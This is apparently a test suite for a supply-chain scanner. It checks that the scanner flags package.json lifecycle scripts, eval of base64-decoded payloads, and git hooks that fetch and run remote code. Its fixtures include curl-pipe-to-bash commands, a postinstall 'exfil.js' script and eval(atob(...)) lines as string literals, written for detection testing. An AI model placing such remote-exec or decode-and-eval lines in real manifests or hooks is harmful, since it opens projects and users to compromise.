import { describe, expect, test } from "bun:test";
import {
  scanHookContent,
  scanPackageJsonLifecycle,
  scanSourceContent,
} from "../../../script/check-supply-chain.js";

// The fixtures below embed the very attack signatures the scanner flags; they live in
// string literals (never executed) and in `test/`, which the CLI deliberately does not
// scan, so the suite cannot flag itself.

describe("supply-chain pattern scan", () => {
  describe("package.json lifecycle scripts", () => {
    test("flags an unreviewed lifecycle script", () => {
      const violations = scanPackageJsonLifecycle(
        "packages/brewva-evil/package.json",
        JSON.stringify({ scripts: { postinstall: "node exfil.js" } }),
      );
      expect(violations.map((violation) => violation.rule)).toContain(
        "package-json-lifecycle-script",
      );
    });

    test("allows a reviewed, allowlisted lifecycle script", () => {
      const violations = scanPackageJsonLifecycle(
        "package.json",
        JSON.stringify({ scripts: { prepare: "./script/install-git-hooks.sh" } }),
      );
      expect(violations).toEqual([]);
    });

    test("flags an allowlisted lifecycle key whose command was swapped for a malicious one", () => {
      // The `package.json::prepare` KEY is allowlisted, but allowlisting is command-exact:
      // changing the body to a remote-exec payload must still trip the gate.
      const violations = scanPackageJsonLifecycle(
        "package.json",
        JSON.stringify({ scripts: { prepare: "curl https://example.test/x.sh | bash" } }),
      );
      expect(violations.map((violation) => violation.rule)).toContain(
        "package-json-lifecycle-script",
      );
    });

    test("accepts a manifest with no lifecycle scripts", () => {
      const violations = scanPackageJsonLifecycle(
        "packages/brewva-example/package.json",
        JSON.stringify({ scripts: { build: "tsc -b", test: "bun test" } }),
      );
      expect(violations).toEqual([]);
    });
  });

  describe("base64-decode-into-eval in source", () => {
    test("flags eval of a base64-decoded payload", () => {
      const violations = scanSourceContent("fixture.ts", `eval(atob("ZXZpbA=="));`);
      expect(violations.map((violation) => violation.rule)).toContain("base64-decode-into-eval");
    });

    test("flags new Function over a base64 buffer within a short window", () => {
      const violations = scanSourceContent(
        "fixture.ts",
        `
const payload = Buffer.from(blob, "base64").toString();
const run = new Function(payload);
`,
      );
      expect(violations.map((violation) => violation.rule)).toContain("base64-decode-into-eval");
    });

    test("accepts base64 decoding with no eval (credentials, transport)", () => {
      const violations = scanSourceContent(
        "fixture.ts",
        `const token = Buffer.from(encoded, "base64").toString("utf8");`,
      );
      expect(violations).toEqual([]);
    });

    test("accepts eval/Function with no base64 nearby", () => {
      const violations = scanSourceContent(
        "fixture.ts",
        `const compiled = new Function("return value + 1");`,
      );
      expect(violations).toEqual([]);
    });

    test("suppresses a reviewed instance with an allow comment", () => {
      const violations = scanSourceContent(
        "fixture.ts",
        `
// supply-chain-allow base64-decode-into-eval: fixed test vector, never executed.
eval(atob("ZXZpbA=="));
`,
      );
      expect(violations).toEqual([]);
    });
  });

  describe("install-hook content", () => {
    test("flags a hook that pipes fetched remote code into a shell", () => {
      const violations = scanHookContent(
        ".githooks/pre-commit",
        `curl https://example.test/install.sh | bash`,
      );
      expect(violations.map((violation) => violation.rule)).toContain("install-hook-remote-exec");
    });

    test("accepts the repo's actual format-check hook", () => {
      const violations = scanHookContent(
        ".githooks/pre-commit",
        `#!/usr/bin/env sh\nset -eu\nbun run format:staged:check\n`,
      );
      expect(violations).toEqual([]);
    });
  });
});
